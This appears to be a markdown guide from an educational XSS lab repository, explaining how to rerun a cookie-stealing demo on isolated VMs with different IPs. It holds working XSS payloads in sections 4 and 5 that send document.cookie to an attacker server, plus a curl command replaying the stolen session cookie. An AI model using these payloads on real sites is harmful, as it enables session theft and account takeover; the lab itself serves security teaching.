# 🌐 Portable Lab Guide — Bring Your Own IPs

Use this guide when you (or a colleague) want to run the CookieCatcher
attack on a **different isolated lab** with different IP addresses.

> 📌 **This guide does NOT replace** `LAB_GUIDE.md` (which is locked to
> the original `10.0.2.3` / `10.0.2.15` setup). It exists alongside it
> so future learners can adapt the lab without editing the original.

---

## 🎯 TL;DR — Will the same code work with new IPs?

**Yes.** The PHP code (`cookiecatcher.php`, `vulnerable-app/`,
`secure-app/`, `defenses/`) does **not** hardcode any IP. It binds to
`0.0.0.0` and listens on whatever interface the OS gives it.

Only **three** runtime values change when you move to a new lab:

| # | Where it lives                          | What it is                       |
|---|-----------------------------------------|----------------------------------|
| 1 | The XSS payload pasted into the form    | Attacker IP (where to send cookie) |
| 2 | The `curl -b` replay command on Kali    | Attacker IP (where to hit the app) |
| 3 | Browser URL bar on the victim VM        | Attacker IP (target site)         |

The **victim IP** is never typed anywhere — it's discovered automatically
when the victim's browser connects. You only need it for documentation
(network diagram + trial table) and for the connectivity ping check.

---

## 🧮 Variables to substitute (cheat sheet)

Pick your IPs and pin them down here, then use the same two values
everywhere this guide says **`<ATTACKER_IP>`** / **`<VICTIM_IP>`**.

```text
ATTACKER_IP = <ATTACKER_IP>      # the Kali / attacker VM, e.g. 192.168.99.10
VICTIM_IP   = <VICTIM_IP>        # the Win 7 / victim VM,   e.g. 192.168.99.20
```

**Highlighted in every code box below**, the placeholders look like this:

```text
http://<ATTACKER_IP>:8080/      ← every payload / curl uses this
ping <VICTIM_IP>                ← only used in pre-flight checks
```

> 💡 Tip for learners: do a **find-and-replace** in your editor on the
> two strings `<ATTACKER_IP>` and `<VICTIM_IP>` before running anything.

---

## 1. Pick your isolated network

You can use any of the following — the code does not care, as long as
the two VMs can reach each other on the listening ports:

| Network type (VirtualBox)  | Typical subnet      | Notes                                          |
|----------------------------|---------------------|------------------------------------------------|
| NAT Network (recommended)  | `10.0.2.0/24`       | Stable VM-to-VM. Used by the original lab.     |
| Host-Only Adapter          | `192.168.56.0/24`   | Works but produced inconsistent results for us |
| Internal Network           | any (you set it)    | No host access — fully isolated, ideal for class |
| Bridged Adapter            | your LAN subnet     | Only with explicit authorization               |

For each VM in *Settings → Network*, attach **Adapter 1** to the chosen
network type, boot the VM, and confirm the assigned IP.

### Worked examples

| Scenario         | `<ATTACKER_IP>`    | `<VICTIM_IP>`     |
|------------------|--------------------|-------------------|
| A — NAT Network  | `10.0.2.3`         | `10.0.2.15`       |
| B — Host-Only    | `192.168.56.10`    | `192.168.56.20`   |
| C — Internal Net | `172.16.50.10`     | `172.16.50.20`    |
| D — Your lab     | `<ATTACKER_IP>`    | `<VICTIM_IP>`     |

Pick **one row** and substitute it into every code block below.

---

## 2. Pre-flight (run this every session)

**On the attacker VM (Kali):**
```bash
ip a | grep inet                    # confirm <ATTACKER_IP>
ping -c 3 <VICTIM_IP>               # confirm victim reachable
```

**On the victim VM (Win 7):**
```cmd
ipconfig                            :: confirm <VICTIM_IP>
ping <ATTACKER_IP>                  :: confirm Kali reachable
```

Both pings must succeed before continuing.

---

## 3. Start the three servers (Kali, in `demo-environment/`)

These commands are **identical** regardless of your IPs — `0.0.0.0`
binds on every interface:

```bash
# Terminal 1 — CookieCatcher (attacker receiver)
php -S 0.0.0.0:8080 -t attacker attacker/cookiecatcher.php

# Terminal 2 — Vulnerable target
php -S 0.0.0.0:8001 -t vulnerable-app

# Terminal 3 — Secure version (used in the defense simulation)
php -S 0.0.0.0:8002 -t secure-app
```

Smoke test from Kali:
```bash
curl -s -o /dev/null -w "vuln  %{http_code}\n" http://<ATTACKER_IP>:8001
curl -s -o /dev/null -w "catch %{http_code}\n" http://<ATTACKER_IP>:8080
```
Both must return `200`.

---

## 4. Inject the XSS payload (the only place IP must change)

On the **victim VM**, browse to:
```
http://<ATTACKER_IP>:8001
```

Paste this in the comment box, **after replacing `<ATTACKER_IP>`**:

```html
<img src=x onerror="this.src='http://<ATTACKER_IP>:8080/?c='+document.cookie">
```

Click **Submit**, then reload the page. CookieCatcher on Kali will print
the captured cookie.

### Auto-fill helper (optional, run on Kali)

Tired of editing the IP by hand? The repo ships with a tiny script that
prints copy-paste-ready payloads using the IP you pass it:

```bash
bash attacker/generate_payload.sh <ATTACKER_IP>
```

Sample output:
```
=== Payloads for ATTACKER_IP = 192.168.99.10 ===

[1] Image onerror (recommended)
<img src=x onerror="this.src='http://192.168.99.10:8080/?c='+document.cookie">

[2] SVG onload
<svg onload="fetch('http://192.168.99.10:8080/?c='+document.cookie)">

[3] Image onerror with base64 cookie
<img src=x onerror="fetch('http://192.168.99.10:8080/?c='+btoa(document.cookie))">
```

---

## 5. Replay / hijack the session (Kali)

Use the cookie value you just captured, with the new attacker IP:

```bash
curl -i -b "PHPSESSID=<STOLEN_VALUE>" http://<ATTACKER_IP>:8001
```

Or in a Kali browser: open `http://<ATTACKER_IP>:8001`, set the
`PHPSESSID` cookie via DevTools, reload — you are now the victim.

---

## 6. Defense simulation (still IP-portable)

Same payload, target the secure app instead of the vulnerable one:

```
http://<ATTACKER_IP>:8002
```

Expected: blocked at every layer (HttpOnly, CSP, sanitizer, WAF
filter, session binding). CookieCatcher logs no new entry.

---

## 7. Trial table template (fill in for your IPs)

| Trial | Source IP        | Target URL                              | Result        |
|-------|------------------|-----------------------------------------|---------------|
| 1     | `<VICTIM_IP>`    | `http://<ATTACKER_IP>:8001` (vuln)      | ✅ stolen     |
| 2     | `<VICTIM_IP>`    | `http://<ATTACKER_IP>:8001` (vuln)      | ✅ stolen     |
| 3     | `<VICTIM_IP>`    | `http://<ATTACKER_IP>:8002` (secure)    | ❌ blocked    |
| 4     | `<ATTACKER_IP>`  | replay `curl -b "PHPSESSID=..."`        | ✅ hijack     |

---

## 8. Why the source code never needs editing

Just so future learners trust this is portable:

```bash
# Confirm there are zero hardcoded lab IPs in any PHP file
grep -RE "192\.168\.|10\.0\." demo-environment/ \
     --include="*.php" --include="*.conf" --include="*.sh"
```

The only hits are inside **comments** and the example IP in
`xss-payloads.txt`. The runtime code itself is IP-free.

---

## 9. Common gotchas when switching networks

- **Payload not firing on victim?** Make sure you used the **literal**
  `<ATTACKER_IP>` you got from `ip a`, not `localhost`.
- **`Connection refused` from victim** → PHP server must be bound to
  `0.0.0.0`, not `127.0.0.1` (already handled in our commands).
- **Modern browsers strip the payload** → use IE 11 or older Firefox on
  the victim VM, OR test with `curl` from another VM as a stand-in.
- **VMs on different networks can't see each other** → check that *both*
  VMs are attached to the *same* internal/NAT network and have IPs in
  the same subnet (`<ATTACKER_IP>` and `<VICTIM_IP>` must share the
  first three octets in most lab setups).

---

## 10. Future-proofing: what to update if you change IPs again

You only need to:

1. Re-run the pre-flight pings (§2).
2. Regenerate the payload with the new `<ATTACKER_IP>` (§4 helper).
3. Update your **report's** trial table and network diagram with the
   new addresses.

The PHP source code, defense configs, and `setup.sh` need **no change**.

---

## 📎 Related documents

- [`LAB_GUIDE.md`](LAB_GUIDE.md) — original lab, fixed `10.0.2.x` IPs
- [`ATTACK_SIMULATION_GUIDE.md`](ATTACK_SIMULATION_GUIDE.md) — same flow on `localhost`
- [`README.md`](README.md) — overview and folder map

Happy hacking — *ethically*. 🛡️
